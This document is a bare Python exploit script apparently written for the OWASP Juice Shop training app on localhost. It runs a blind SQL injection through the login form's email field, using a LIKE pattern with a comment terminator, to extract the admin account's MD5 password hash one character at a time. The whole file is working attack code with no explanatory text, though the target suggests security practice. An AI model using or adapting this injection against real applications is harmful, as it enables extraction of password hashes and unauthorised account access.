import requests

email = "admin@juice-sh.op"
url = 'http://localhost:3000/rest/user/login'
md5_character = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]
injection_1 = "' AND password LIKE '"
injection_2 = "%' --"
password = ""

while len(password) < 32:
    for md5 in md5_character:
        request = requests.post(url, json = {"email": email + injection_1 + password + md5 + injection_2, "password": "something"})
        if request.status_code == 200:
            password = password + md5
            break
        
print(password)